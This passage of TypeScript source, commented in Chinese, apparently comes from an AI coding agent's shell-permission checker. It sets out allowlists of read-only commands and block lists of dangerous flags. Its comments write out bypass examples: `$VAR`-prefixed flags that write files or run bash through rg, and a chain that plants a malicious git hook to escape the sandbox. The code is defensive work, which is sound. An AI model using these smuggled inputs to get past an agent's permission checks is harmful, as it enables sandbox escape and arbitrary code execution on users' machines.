          } else {
            i++
          }
        } else {
          if (DANGEROUS_CAPABILITIES.has(token)) return true
          i++
        }
      }
      return false
    },
  },

  // ss — 套接字统计（iproute2）。等效于 netstat 的只读查询工具。
  // 安全: -K/--kill（强制关闭套接字）和 -D/--diag（将原始数据转储到文件）
  // 被故意排除。-F/--filter（从文件读取过滤器）也已排除。
  ss: {
    safeFlags: {
      '-h': 'none', // 帮助
      '--help': 'none',
      '-V': 'none', // 版本
      '--version': 'none',
      '-n': 'none', // 数字显示
      '--numeric': 'none',
      '-r': 'none', // 解析主机名
      '--resolve': 'none',
      '-a': 'none', // 所有套接字
      '--all': 'none',
      '-l': 'none', // 仅监听套接字
      '--listening': 'none',
      '-o': 'none', // 显示选项
      '--options': 'none',
      '-e': 'none', // 扩展信息
      '--extended': 'none',
      '-m': 'none', // 内存使用
      '--memory': 'none',
      '-p': 'none', // 显示进程
      '--processes': 'none',
      '-i': 'none', // 内部信息
      '--info': 'none',
      '-s': 'none', // 汇总
      '--summary': 'none',
      '-4': 'none', // IPv4
      '--ipv4': 'none',
      '-6': 'none', // IPv6
      '--ipv6': 'none',
      '-0': 'none', // 数据包套接字
      '--packet': 'none',
      '-t': 'none', // TCP
      '--tcp': 'none',
      '-M': 'none', // MPTCP
      '--mptcp': 'none',
      '-S': 'none', // SCTP
      '--sctp': 'none',
      '-u': 'none', // UDP
      '--udp': 'none',
      '-d': 'none', // DCCP
      '--dccp': 'none',
      '-w': 'none', // 原始套接字
      '--raw': 'none',
      '-x': 'none', // Unix 套接字
      '--unix': 'none',
      '--tipc': 'none', // TIPC
      '--vsock': 'none', // VM 套接字
      '-f': 'string', // 地址族
      '--family': 'string',
      '-A': 'string', // 套接字查询
      '--query': 'string',
      '--socket': 'string',
      '-Z': 'none', // 安全上下文
      '--context': 'none',
      '-z': 'none', // 安全上下文（显示）
      '--contexts': 'none',
      // 安全: -N/--net 已排除 — 执行 setns()、unshare()、mount()、umount()
      // 以切换网络命名空间。虽然隔离到 fork 进程，但仍过于侵入。
      '-b': 'none', // BPF 过滤器信息
      '--bpf': 'none',
      '-E': 'none', // 事件
      '--events': 'none',
      '-H': 'none', // 无头部
      '--no-header': 'none',
      '-O': 'none', // 单行
      '--oneline': 'none',
      '--tipcinfo': 'none', // TIPC 信息
      '--tos': 'none', // TOS 信息
      '--cgroup': 'none', // cgroup 信息
      '--inet-sockopt': 'none', // 套接字选项
      // 安全: -K/--kill 已排除 — 强制关闭套接字
      // 安全: -D/--diag 已排除 — 将原始 TCP 数据转储到文件
      // 安全: -F/--filter 已排除 — 从文件读取过滤器表达式
    },
  },

  // fd/fdfind — 快速文件查找工具 (fd-find)。只读搜索工具。
  // 安全: -x/--exec（对每个结果执行命令）和 -X/--exec-batch
  // （对所有结果执行命令）已被有意排除。
  fd: { safeFlags: { ...FD_SAFE_FLAGS } },
  // fdfind 是 Debian/Ubuntu 上 fd 的包名称 — 同一二进制，相同标志
  fdfind: { safeFlags: { ...FD_SAFE_FLAGS } },

  ...PYRIGHT_READ_ONLY_COMMANDS,
  ...DOCKER_READ_ONLY_COMMANDS,
}

// gh 命令仅限 ant 用户，因为它们会发起网络请求，
// 这与只读验证的"无网络访问"原则相悖
const ANT_ONLY_COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  // 来自共享验证映射的所有 gh 只读命令
  ...GH_READ_ONLY_COMMANDS,
  // aki — Anthropic 内部知识库搜索 CLI。
  // 网络只读（与 gh 相同策略）。--audit-csv 已排除：写入磁盘。
  aki: {
    safeFlags: {
      '-h': 'none',
      '--help': 'none',
      '-k': 'none',
      '--keyword': 'none',
      '-s': 'none',
      '--semantic': 'none',
      '--no-adaptive': 'none',
      '-n': 'number',
      '--limit': 'number',
      '-o': 'number',
      '--offset': 'number',
      '--source': 'string',
      '--exclude-source': 'string',
      '-a': 'string',
      '--after': 'string',
      '-b': 'string',
      '--before': 'string',
      '--collection': 'string',
      '--drive': 'string',
      '--folder': 'string',
      '--descendants': 'none',
      '-m': 'string',
      '--meta': 'string',
      '-t': 'string',
      '--threshold': 'string',
      '--kw-weight': 'string',
      '--sem-weight': 'string',
      '-j': 'none',
      '--json': 'none',
      '-c': 'none',
      '--chunk': 'none',
      '--preview': 'none',
      '-d': 'none',
      '--full-doc': 'none',
      '-v': 'none',
      '--verbose': 'none',
      '--stats': 'none',
      '-S': 'number',
      '--summarize': 'number',
      '--explain': 'none',
      '--examine': 'string',
      '--url': 'string',
      '--multi-turn': 'number',
      '--multi-turn-model': 'string',
      '--multi-turn-context': 'string',
      '--no-rerank': 'none',
      '--audit': 'none',
      '--local': 'none',
      '--staging': 'none',
    },
  },
}

function getCommandAllowlist(): Record<string, CommandConfig> {
  let allowlist: Record<string, CommandConfig> = COMMAND_ALLOWLIST
  // 在 Windows 上，xargs 可被用作数据到代码的桥梁：如果文件包含
  // UNC 路径，`cat file | xargs cat` 会将路径传给 cat，触发 SMB
  // 解析。由于 UNC 路径在文件内容中（而非命令字符串中），
  // 基于正则的检测无法捕捉此问题。
  if (getPlatform() === 'windows') {
    const { xargs: _, ...rest } = allowlist
    allowlist = rest
  }
  if (process.env.USER_TYPE === 'ant') {
    return { ...allowlist, ...ANT_ONLY_COMMAND_ALLOWLIST }
  }
  return allowlist
}

/**
 * 可安全用作 xargs 目标以自动批准的命令列表。
 *
 * 安全：仅当命令没有任何可能以下操作的标志时，才可添加到此列表：
 * 1. 写入文件（例如 find 的 -fprint、sed 的 -i）
 * 2. 执行代码（例如 find 的 -exec、awk 的 system()、perl 的 -e）
 * 3. 发起网络请求
 *
 * 这些命令必须是纯只读工具。当 xargs 使用其中某个命令作为目标时，
 * 我们在目标命令之后停止验证标志（参见 isCommandSafeViaFlagParsing 中的 `break`），
 * 因此命令本身不得有任何危险标志，而不仅仅是一个安全的子集。
 *
 * 每个命令都通过检查其手册页以确认没有危险能力。
 */
const SAFE_TARGET_COMMANDS_FOR_XARGS = [
  'echo', // 仅输出，无危险标志
  'printf', // xargs 运行 /usr/bin/printf（二进制），而非 bash 内置 — 不支持 -v
  'wc', // 只读计数，无危险标志
  'grep', // 只读搜索，无危险标志
  'head', // 只读，无危险标志
  'tail', // 只读（包括 -f 跟踪），无危险标志
]

/**
 * 统一的命令验证函数，替代各个独立的验证函数。
 * 使用 COMMAND_ALLOWLIST 的声明式配置来验证命令及其标志。
 * 处理组合标志、参数验证以及 shell 引号绕过检测。
 */
export function isCommandSafeViaFlagParsing(command: string): boolean {
  // 解析命令，使用 shell-quote 获取各个令牌以确保准确性
  // 处理通配符操作符，将其转换为字符串；从本函数的角度来看它们无关紧要
  const parseResult = tryParseShellCommand(command, env => `$${env}`)
  if (!parseResult.success) return false

  const parsed = parseResult.tokens.map(token => {
    if (typeof token !== 'string') {
      token = token as { op: 'glob'; pattern: string }
      if (token.op === 'glob') {
        return token.pattern
      }
    }
    return token
  })

  // 如果有操作符（管道、重定向等），则不是简单命令。
  // 将命令分解为组成部分的操作在本函数的上游处理，
  // 因此我们在此拒绝任何带有操作符的命令。
  const hasOperators = parsed.some(token => typeof token !== 'string')
  if (hasOperators) {
    return false
  }

  // Now we know all tokens are strings
  const tokens = parsed as string[]

  if (tokens.length === 0) {
    return false
  }

  // Find matching command configuration
  let commandConfig: CommandConfig | undefined
  let commandTokens: number = 0

  // 首先检查多词命令（例如 "git diff"、"git stash list"）
  const allowlist = getCommandAllowlist()
  for (const [cmdPattern] of Object.entries(allowlist)) {
    const cmdTokens = cmdPattern.split(' ')
    if (tokens.length >= cmdTokens.length) {
      let matches = true
      for (let i = 0; i < cmdTokens.length; i++) {
        if (tokens[i] !== cmdTokens[i]) {
          matches = false
          break
        }
      }
      if (matches) {
        commandConfig = allowlist[cmdPattern]
        commandTokens = cmdTokens.length
        break
      }
    }
  }

  if (!commandConfig) {
    return false // 命令不在允许列表中
  }

  // 对 git ls-remote 进行特殊处理，拒绝可能导致数据泄露的 URL
  if (tokens[0] === 'git' && tokens[1] === 'ls-remote') {
    // 检查是否有任何参数看起来像 URL 或远程仓库规范
    for (let i = 2; i < tokens.length; i++) {
      const token = tokens[i]
      if (token && !token.startsWith('-')) {
        // 拒绝 HTTP/HTTPS URL
        if (token.includes('://')) {
          return false
        }
        // 拒绝 SSH URL，如 git@github.com:user/repo.git
        if (token.includes('@') || token.includes(':')) {
          return false
        }
        // 拒绝变量引用
        if (token.includes('$')) {
          return false
        }
      }
    }
  }

  // 安全：拒绝任何包含 `$`（变量展开）的令牌。在解析时
  // `env => \`$${env}\`` 回调将 `$VAR` 保留为令牌中的字面文本，
  // 但 bash 在运行时将其展开（未设置变量 → 空字符串）。
  // 这种解析器差异同时绕过了 validateFlags 和回调：
  //
  //   (1) `$VAR` 前缀绕过 validateFlags 的 `startsWith('-')` 检查：
  //       `git diff "$Z--output=/tmp/pwned"` → 令牌 `$Z--output=/tmp/pwned`
  //       （以 `$` 开头）作为位置参数穿透。Bash 执行
  //       `git diff --output=/tmp/pwned`。任意文件写入，零权限。
  //
  //   (2) `$VAR` 前缀 → 通过 `rg --pre` 实现 RCE：
  //       `rg . "$Z--pre=bash" FILE` → 执行 `bash FILE`。rg 的配置中
  //       没有正则表达式也没有回调。单步任意代码执行。
  //
  //   (3) `$VAR` 中缀绕过 additionalCommandIsDangerousCallback 正则：
  //       `ps ax"$Z"e` → 令牌 `ax$Ze`。ps 回调正则表达式
  //       `/^[a-zA-Z]*e[a-zA-Z]*$/` 在 `$` 上失败 → "不危险"。Bash 执行
  //       `ps axe` → 所有进程的环境变量。仅修复 `$` 前缀令牌无法堵住此漏洞。
  //
  // 我们检查命令前缀之后的所有令牌。任何 `$` 都意味着我们无法
  // 确定运行时令牌值，因此无法验证只读安全性。
  // 此检查必须在 validateFlags 和回调之前运行。
  for (let i = commandTokens; i < tokens.length; i++) {
    const token = tokens[i]
    if (!token) continue
    // 拒绝任何包含 $（变量展开）的令牌
    if (token.includes('$')) {
      return false
    }
    // 拒绝同时包含 `{` 和 `,` 的令牌（花括号展开混淆）。
    // `git diff {@'{'0},--output=/tmp/pwned}` → shell-quote 去除引号
    // → 令牌 `{@{0},--output=/tmp/pwned}` 包含 `{` + `,` → 花括号展开。
    // 这与 bashSecurity.ts 中的 validateBraceExpansion 构成深度防御。
    // 我们要求同时存在 `{` 和 `,` 以避免对合法模式的误报：
    // `stash@{0}`（git 引用，有 `{` 无 `,`），`{{.State}}`（Go
    // 模板，无 `,`），`prefix-{}-suffix`（xargs，无 `,`）。序列形式
    // `{1..5}` 也需要检查（有 `{` + `..`）。
    if (token.includes('{') && (token.includes(',') || token.includes('..'))) {
      return false
    }
  }

  // 从命令令牌之后开始验证标志
  if (
    !validateFlags(tokens, commandTokens, commandConfig, {
      commandName: tokens[0],
      rawCommand: command,
      xargsTargetCommands:
        tokens[0] === 'xargs' ? SAFE_TARGET_COMMANDS_FOR_XARGS : undefined,
    })
  ) {
    return false
  }

  if (commandConfig.regex && !commandConfig.regex.test(command)) {
    return false
  }
  if (!commandConfig.regex && /`/.test(command)) {
    return false
  }
  // 阻止 grep/rg 模式中的换行符和回车符，它们可能被用于注入
  if (
    !commandConfig.regex &&
    (tokens[0] === 'rg' || tokens[0] === 'grep') &&
    /[\n\r]/.test(command)
  ) {
    return false
  }
  if (
    commandConfig.additionalCommandIsDangerousCallback &&
    commandConfig.additionalCommandIsDangerousCallback(
      command,
      tokens.slice(commandTokens),
    )
  ) {
    return false
  }

  return true
}

/**
 * 创建匹配命令安全调用的正则表达式模式。
 *
 * 该正则通过阻止以下内容确保命令被安全调用：
 * - 可能导致命令注入或重定向的 shell 元字符
 * - 通过反引号或 $() 进行的命令替换
 * - 可能包含恶意载荷的变量展开
 * - 环境变量赋值绕过 (command=value)
 *
 * @param command 命令名称（例如 'date'、'npm list'、'ip addr'）
 * @returns 匹配命令安全调用的 RegExp
 */
function makeRegexForSafeCommand(command: string): RegExp {
  // 创建正则模式：/^command(?:\s|$)[^<>()$`|{}&;\n\r]*$/
  return new RegExp(`^${command}(?:\\s|$)[^<>()$\`|{}&;\\n\\r]*$`)
}

// 可安全执行的简单命令（使用 makeRegexForSafeCommand 转换为正则模式）
// 警告：如果你要在此处添加新命令，请非常小心以确保
// 它们真正安全。这包括确保：
// 1. 它们没有任何允许文件写入或命令执行的标志
// 2. 使用 makeRegexForSafeCommand() 确保正确的正则模式创建
const READONLY_COMMANDS = [
  // 来自共享验证的跨平台命令
  ...EXTERNAL_READONLY_COMMANDS,

  // Unix/bash 特定只读命令（未共享是因为它们在 PowerShell 中不存在）

  // 时间和日期
  'cal',
  'uptime',

  // 文件内容查看（相对路径单独处理）
  'cat',
  'head',
  'tail',
  'wc',
  'stat',
  'strings',
  'hexdump',
  'od',
  'nl',

  // 系统信息
  'id',
  'uname',
  'free',
  'df',
  'du',
  'locale',
  'groups',
  'nproc',

  // 路径信息
  'basename',
  'dirname',
  'realpath',

  // 文本处理
  'cut',
  'paste',
  'tr',
  'column',
  'tac', // 反向 cat — 以反向行顺序显示文件内容
  'rev', // 反转每行中的字符
  'fold', // 将行折行为指定宽度
  'expand', // 将制表符转换为空格
  'unexpand', // 将空格转换为制表符
  'fmt', // 简单文本格式化程序 — 仅输出到 stdout
  'comm', // 逐行比较已排序的文件
  'cmp', // 逐字节比较文件
  'numfmt', // 数字格式转换

  // 路径信息（附加）
  'readlink', // 解析符号链接 — 显示符号链接的目标

  // 文件比较
  'diff',

  // true 和 false，用于静默或创建错误
  'true',
  'false',

  // 其他安全命令
  'sleep',
  'which',
  'type',
  'expr', // 计算表达式（算术、字符串匹配）
  'test', // 条件求值（文件检查、比较）
  'getconf', // 获取系统配置值
  'seq', // 生成数字序列
  'tsort', // 拓扑排序
  'pr', // 分页文件以便打印
]

// 需要自定义正则表达式的复杂命令
// 警告：如有可能，避免在此处添加新正则表达式，优先使用 COMMAND_ALLOWLIST。
// 这种基于允许列表的 CLI 标志方法更安全，可避免来自 GNU getopt_long 的漏洞。
const READONLY_COMMAND_REGEXES = new Set([
  // 使用 makeRegexForSafeCommand 将简单命令转换为正则模式
  ...READONLY_COMMANDS.map(makeRegexForSafeCommand),

  // 不执行命令或使用变量的 echo
  // 允许单引号中的换行符（安全），但不允许双引号中的换行符（可能因变量展开而危险）
  // 同时允许末尾的可选 2>&1 stderr 重定向
  /^echo(?:\s+(?:'[^']*'|"[^"$<>\n\r]*"|[^|;&`$(){}><#\\!"'\s]+))*(?:\s+2>&1)?\s*$/,

  // Claude CLI 帮助
  /^claude -h$/,
  /^claude --help$/,

  // Git 只读命令现在通过 COMMAND_ALLOWLIST 进行显式标志验证处理
  // (git status, git blame, git ls-files, git config --get, git remote, git tag, git branch)

  /^uniq(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?|-[fsw]\s+\d+))*(?:\s|$)\s*$/, // 仅允许标志，不允许输入/输出文件

  // 系统信息
  /^pwd$/,
  /^whoami$/,
  // env 和 printenv 已移除 — 可能暴露敏感环境变量

  // 开发工具版本检查 — 仅精确匹配，不允许后缀。
  // 安全：`node -v --run <task>` 会执行 package.json 脚本，因为
  // Node 在 -v 之前处理 --run。Python/python3 --version 也进行了锚定
  // 以实现深度防御。这些此前在 EXTERNAL_READONLY_COMMANDS 中，
  // 通过 makeRegexForSafeCommand 处理并允许任意后缀。
  /^node -v$/,
  /^node --version$/,
  /^python --version$/,
  /^python3 --version$/,

  // 其他安全命令
  // tree 命令已移至 COMMAND_ALLOWLIST 进行适当的标志验证（阻止 -o/--output）
  /^history(?:\s+\d+)?\s*$/, // 仅允许裸 history 或带数字参数的 history — 防止文件写入
  /^alias$/,
  /^arch(?:\s+(?:--help|-h))?\s*$/, // 仅允许 arch 带帮助标志或无参数

  // 网络命令 — 仅允许无参数的确切命令以防止网络操作
  /^ip addr$/, // 仅允许 "ip addr" 无额外参数
  /^ifconfig(?:\s+[a-zA-Z][a-zA-Z0-9_-]*)?\s*$/, // 仅允许 ifconfig 带接口名称（必须以字母开头）

  // 使用 jq 进行 JSON 处理 — 允许内联过滤器和文件参数
  // 文件参数由 pathValidation.ts 单独验证
  // 允许引号内的管道和复杂表达式，但阻止危险标志
  // 阻止命令替换 — 反引号即使在 jq 的单引号中也是危险的
  // 阻止 -f/--from-file、--rawfile、--slurpfile（将文件读入 jq）、--run-tests、-L/--library-path（加载可执行模块）
  // 阻止 'env' 内置和 '$ENV' 对象（可访问环境变量，深度防御）
  /^jq(?!\s+.*(?:-f\b|--from-file|--rawfile|--slurpfile|--run-tests|-L\b|--library-path|\benv\b|\$ENV\b))(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?))*(?:\s+'[^'`]*'|\s+"[^"`]*"|\s+[^-\s'"][^\s]*)+\s*$/,

  // 路径命令（路径验证确保它们被允许）
  // cd 命令 — 允许更改目录
  /^cd(?:\s+(?:'[^']*'|"[^"]*"|[^\s;|&`$(){}><#\\]+))?$/,
  // ls 命令 — 允许列出目录
  /^ls(?:\s+[^<>()$`|{}&;\n\r]*)?$/,
  // find 命令 — 阻止危险标志
  // 允许转义括号 \( 和 \) 用于分组，但阻止未转义的括号
  // 注意：\\[()] 必须放在字符类之前，以确保 \( 被匹配为转义括号，
  // 而不是反斜杠 + 括号（由于括号被排除在字符类外将导致失败）
  /^find(?:\s+(?:\\[()]|(?!-delete\b|-exec\b|-execdir\b|-ok\b|-okdir\b|-fprint0?\b|-fls\b|-fprintf\b)[^<>()$`|{}&;\n\r\s]|\s)+)?$/,
])

/**
 * 检查命令是否包含在 bash 视为字面量的引号上下文之外的通配符（?, *, [, ]）
 * 或可展开的 `$` 变量。这些可能展开以绕过我们基于正则的安全检查。
 *
 * 通配符示例：
 * - `python *` 如果存在名为 `--help` 的文件，可能展开为 `python --help`
 * - `find ./ -?xec` 如果存在此类文件，可能展开为 `find ./ -exec`
 * 通配符在单引号和双引号内部都是字面量。
 *
 * 变量展开示例：
 * - `uniq --skip-chars=0$_` → `$_` 展开为上一个命令的最后一个参数；
 *   通过 IFS 单词分割，将位置参数偷渡绕过"仅标志"正则表达式。
 *   `echo " /etc/passwd /tmp/x"; uniq --skip-chars=0$_` → 文件写入。
 * - `cd "$HOME"` → 双引号内的 `$HOME` 在运行时展开。
 * 变量仅在单引号内是字面量；在双引号内和未引号的情况下会展开。
 *
 * `$` 检查守卫 READONLY_COMMAND_REGEXES 回退路径。isCommandSafeViaFlagParsing
 * 中的 `$` 令牌检查仅覆盖 COMMAND_ALLOWLIST 命令；
 * 手写正则表达式如 uniq 的 `\S+` 和 cd 的 `"[^"]*"` 允许 `$`。
 * 匹配 `$` 后跟 `[A-Za-z_@*#?!$0-9-]`，覆盖 `$VAR`、`$_`、`$@`、
 * `$*`、`$#`、`$?`、`$!`、`$$`、`$-`、`$0`-`$9`。不匹配 `${` 或 `$(` —
 * 这些由 bashSecurity.ts 中的 COMMAND_SUBSTITUTION_PATTERNS 捕获。
 *
 * @param command 要检查的命令字符串
 * @returns 如果命令包含未引用的通配符或可展开的 `$`，则返回 true
 */
function containsUnquotedExpansion(command: string): boolean {
  // 跟踪引号状态，避免对引号字符串内部的模式产生误报
  let inSingleQuote = false
  let inDoubleQuote = false
  let escaped = false

  for (let i = 0; i < command.length; i++) {
    const currentChar = command[i]

    // 处理转义序列
    if (escaped) {
      escaped = false
      continue
    }

    // 安全：仅在单引号外部将反斜杠视为转义。在 bash 中，
    // `'...'` 内部的 `\` 是字面量 — 它不会转义下一个字符。
    // 没有此保护，`'\'` 会使引号跟踪器不同步：`\` 设置
    // escaped=true，然后闭合的 `'` 被转义跳过消耗，
    // 而不是切换 inSingleQuote。解析器在命令的其余部分
    // 保持在单引号模式，从而遗漏所有后续的展开。
    // 示例：`ls '\' *` — bash 看到通配符 `*`，但不同步的解析器认为
    // `*` 在引号内 → 返回 false（未检测到通配符）。
    // 深度防御：hasShellQuoteSingleQuoteBug 在到达此函数之前
    // 捕获 `'\'` 模式，但我们仍修复跟踪器以与 bashSecurity.ts 中
    // 的正确实现保持一致。
    if (currentChar === '\\' && !inSingleQuote) {
      escaped = true
      continue
    }

    // 更新引号状态
    if (currentChar === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      continue
    }

    if (currentChar === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      continue
    }

    // 在单引号内部：一切都是字面量。跳过。
    if (inSingleQuote) {
      continue
    }

    // 检查 `$` 后跟变量名或特殊参数字符。
    // `$` 在双引号内部和未引号情况下都会展开（只有单引号使其为字面量）。
    if (currentChar === '$') {
      const next = command[i + 1]
      if (next && /[A-Za-z_@*#?!$0-9-]/.test(next)) {
        return true
      }
    }

    // 通配符在双引号内部也是字面量。仅检查未引号的情况。
    if (inDoubleQuote) {
      continue
    }

    // 检查所有引号外部的通配符字符。
    // 这些可能展开为任何内容，包括危险标志。
    if (currentChar && /[?*[\]]/.test(currentChar)) {
      return true
    }
  }

  return false
}

/**
 * 基于 READONLY_COMMAND_REGEXES 检查单个命令字符串是否为只读。
 * 验证单个命令的内部辅助函数。
 *
 * @param command 要检查的命令字符串
 * @returns 如果命令是只读的，则返回 true
 */
function isCommandReadOnly(command: string): boolean {
  // 处理常见的 stderr 到 stdout 重定向模式
  // 此处理同时涵盖完整命令末尾的 "command 2>&1"
  // 以及管道组件中的 "command 2>&1"
  let testCommand = command.trim()
  if (testCommand.endsWith(' 2>&1')) {
    // 移除 stderr 重定向以进行模式匹配
    testCommand = testCommand.slice(0, -5).trim()
  }

  // 检查可能易受 WebDAV 攻击的 Windows UNC 路径
  // 尽早执行此检查，防止任何带有 UNC 路径的命令被标记为只读
  if (containsVulnerableUncPath(testCommand)) {
    return false
  }

  // 检查未引用的通配符和可展开的 `$` 变量，这些可能
  // 绕过我们基于正则的安全检查。我们无法知道它们在运行时
  // 展开为什么，因此无法验证命令是只读的。
  //
  // 通配符：`python *` 如果存在此类文件，可能展开为 `python --help`。
  //
  // 变量：`uniq --skip-chars=0$_` — bash 在运行时将 `$_` 展开为
  // 上一个命令的最后一个参数。通过 IFS 单词分割，这将位置参数
  // 偷渡绕过"仅标志"正则表达式（如 uniq 的 `\S+`）。isCommandSafeViaFlagParsing
  // 中的 `$` 令牌检查仅覆盖 COMMAND_ALLOWLIST 命令；
  // READONLY_COMMAND_REGEXES 中的手写正则表达式（uniq、jq、cd）
  // 没有此类保护。详见 containsUnquotedExpansion 的完整分析。
  if (containsUnquotedExpansion(testCommand)) {
    return false
  }

  // 像 git 这样的工具允许将 `--upload-pack=cmd` 缩写为 `--up=cmd`。
  // 正则过滤器可能被绕过，因此我们改用严格的允许列表验证。
  // 这需要定义一组已知的安全标志。Claude 可以帮助处理此问题，
  // 但请仔细检查以确保没有添加任何允许文件写入、代码执行
  // 或网络请求的标志。
  if (isCommandSafeViaFlagParsing(testCommand)) {
    return true
  }

  for (const regex of READONLY_COMMAND_REGEXES) {
    if (regex.test(testCommand)) {
      // 阻止带 -c 标志的 git 命令，以避免可能导致代码执行的配置选项
      // -c 标志允许内联设置任意 git 配置值，包括危险的配置如
      // core.fsmonitor、diff.external、core.gitProxy 等，这些可以执行任意命令
      // 检查前面有空白、后面跟空白或等号的 -c
      // 使用正则捕获空格、制表符和其他空白（不是 --cached 等其他标志的一部分）
      if (testCommand.includes('git') && /\s-c[\s=]/.test(testCommand)) {
        return false
      }

      // 阻止带 --exec-path 标志的 git 命令，以避免可能导致代码执行的路径操作
      // --exec-path 标志允许覆盖 git 查找可执行文件的目录
      if (
        testCommand.includes('git') &&
        /\s--exec-path[\s=]/.test(testCommand)
      ) {
        return false
      }

      // 阻止带 --config-env 标志的 git 命令，以避免通过环境变量进行配置注入
      // --config-env 标志允许从环境变量设置 git 配置值，这可能
      // 与 -c 标志同样危险（例如 core.fsmonitor、diff.external、core.gitProxy）
      if (
        testCommand.includes('git') &&
        /\s--config-env[\s=]/.test(testCommand)
      ) {
        return false
      }
      return true
    }
  }
  return false
}

/**
 * 检查复合命令是否包含任何 git 命令。
 *
 * @param command 要检查的完整命令字符串
 * @returns 如果有任何子命令是 git 命令，则返回 true
 */
function commandHasAnyGit(command: string): boolean {
  return splitCommand_DEPRECATED(command).some(subcmd =>
    isNormalizedGitCommand(subcmd.trim()),
  )
}

/**
 * 可能被利用进行沙箱逃逸的 git 内部路径模式。
 * 如果命令创建了这些文件然后运行 git，git 命令
 * 可能从创建的文件中执行恶意钩子。
 */
const GIT_INTERNAL_PATTERNS = [
  /^HEAD$/,
  /^objects(?:\/|$)/,
  /^refs(?:\/|$)/,
  /^hooks(?:\/|$)/,
]

/**
 * 检查路径是否为 git 内部路径（HEAD、objects/、refs/、hooks/）。
 */
function isGitInternalPath(path: string): boolean {
  // 通过移除开头的 ./ 或 / 来规范化路径
  const normalized = path.replace(/^\.?\//, '')
  return GIT_INTERNAL_PATTERNS.some(pattern => pattern.test(normalized))
}

// 仅删除或原地修改的命令（不会在新路径创建新文件）
const NON_CREATING_WRITE_COMMANDS = new Set(['rm', 'rmdir', 'sed'])

/**
 * 使用 PATH_EXTRACTORS 从子命令中提取写入路径。
 * 仅返回可以创建新文件/目录的命令的路径
 *（写入/创建操作，排除删除和原地修改）。
 */
function extractWritePathsFromSubcommand(subcommand: string): string[] {
  const parseResult = tryParseShellCommand(subcommand, env => `$${env}`)
  if (!parseResult.success) return []

  const tokens = parseResult.tokens.filter(
    (t): t is string => typeof t === 'string',
  )
  if (tokens.length === 0) return []

  const baseCmd = tokens[0]
  if (!baseCmd) return []

  // 仅考虑可以在目标路径创建文件的命令
  if (!(baseCmd in COMMAND_OPERATION_TYPE)) {
    return []
  }
  const opType = COMMAND_OPERATION_TYPE[baseCmd as PathCommand]
  if (
    (opType !== 'write' && opType !== 'create') ||
    NON_CREATING_WRITE_COMMANDS.has(baseCmd)
  ) {
    return []
  }

  const extractor = PATH_EXTRACTORS[baseCmd as PathCommand]
  if (!extractor) return []

  return extractor(tokens.slice(1))
}

/**
 * 检查复合命令是否写入任何 git 内部路径。
 * 用于检测可能的沙箱逃逸攻击，其中命令创建 git 内部文件
 *（HEAD、objects/、refs/、hooks/）然后运行 git。
 *
 * 安全：复合命令可能通过以下方式绕过裸仓库检测：
 * 1. 在同一命令中创建裸 git 仓库文件（HEAD、objects/、refs/、hooks/）
 * 2. 然后运行 git，这将执行恶意钩子
 *
 * 攻击示例：
 * mkdir -p objects refs hooks && echo '#!/bin/bash\n恶意代码' > hooks/pre-commit && touch HEAD && git status
 *
 * @param command 要检查的完整命令字符串
 * @returns 如果有任何子命令写入 git 内部路径，则返回 true
 */
function commandWritesToGitInternalPaths(command: string): boolean {
  const subcommands = splitCommand_DEPRECATED(command)

  for (const subcmd of subcommands) {
    const trimmed = subcmd.trim()

    // 检查来自基于路径的命令（mkdir、touch、cp、mv）的写入路径
    const writePaths = extractWritePathsFromSubcommand(trimmed)
    for (const path of writePaths) {
      if (isGitInternalPath(path)) {
        return true
      }
    }

    // 检查输出重定向（例如 echo x > hooks/pre-commit）
    const { redirections } = extractOutputRedirections(trimmed)
    for (const { target } of redirections) {
      if (isGitInternalPath(target)) {
        return true
      }
    }
  }

  return false
}

/**
 * 检查 bash 命令的只读约束。
 * 这是验证命令是否为只读的唯一导出函数。
 * 它处理复合命令、沙箱模式和安全检查。
 *
 * @param input 要验证的 bash 命令输入
 * @param compoundCommandHasCd 预计算的标志，指示复合命令中是否存在任何 cd 命令。
 *                              由 commandHasAnyCd() 计算并传入以避免重复计算。
 * @returns 指示命令是否为只读的 PermissionResult
 */
export function checkReadOnlyConstraints(
  input: z.infer<typeof BashTool.inputSchema>,
  compoundCommandHasCd: boolean,
): PermissionResult {
  // DOGE: 防御性检查 —— input 或 command 无效时视为非只读（交给后续权限检查处理）
  if (!input || typeof input.command !== 'string' || !input.command.trim()) {
    return {
      behavior: 'passthrough',
      message: '命令输入为空，需要进一步权限检查',
    }
  }
  const { command } = input

  // 检测命令是否无法解析，如果是则提前返回
  const result = tryParseShellCommand(command, env => `$${env}`)
  if (!result.success) {
    return {
      behavior: 'passthrough',
      message: '命令无法解析，需要进一步权限检查',
    }
  }

  // 在拆分之前检查原始命令的安全性
  // 这很重要，因为 splitCommand_DEPRECATED 可能转换命令
  //（例如 ${VAR} 变为 $VAR）
  if (bashCommandIsSafe_DEPRECATED(command).behavior !== 'passthrough') {
    return {
      behavior: 'passthrough',
      message: '命令不是只读操作，需要进一步权限检查',
    }
  }

  // 在转换之前检查原始命令中的 Windows UNC 路径
  // 这必须在 splitCommand_DEPRECATED 之前完成，因为 splitCommand_DEPRECATED 可能转换反斜杠
  if (containsVulnerableUncPath(command)) {
    return {
      behavior: 'ask',
      message:
        '命令包含可能易受 WebDAV 攻击的 Windows UNC 路径',
    }
  }

  // 检查一次是否有任何子命令是 git 命令（用于下面的多个安全检查）
  const hasGitCommand = commandHasAnyGit(command)

  // 安全：阻止同时包含 cd 和 git 的复合命令
  // 防止通过以下方式逃逸沙箱：cd /恶意/目录 && git status
  // 其中恶意目录包含执行任意代码的假 git 钩子。
  if (compoundCommandHasCd && hasGitCommand) {
    return {
      behavior: 'passthrough',
      message:
        '包含 cd 和 git 的复合命令需要权限检查以增强安全性',
    }
  }

  // 安全：如果当前目录看起来像裸/被利用的 git 仓库，则阻止 git 命令
  // 当攻击者执行以下操作时，防止沙箱逃逸：
  // 1. 删除 .git/HEAD 使正常的 git 目录失效
  // 2. 在当前目录中创建 hooks/pre-commit 或其他 git 内部文件
  // Git 然后将 cwd 视为 git 目录并执行恶意钩子。
  if (hasGitCommand && isCurrentDirectoryBareGitRepo()) {
    return {
      behavior: 'passthrough',
      message:
        '具有裸仓库结构的目录中的 Git 命令需要权限检查以增强安全性',
    }
  }

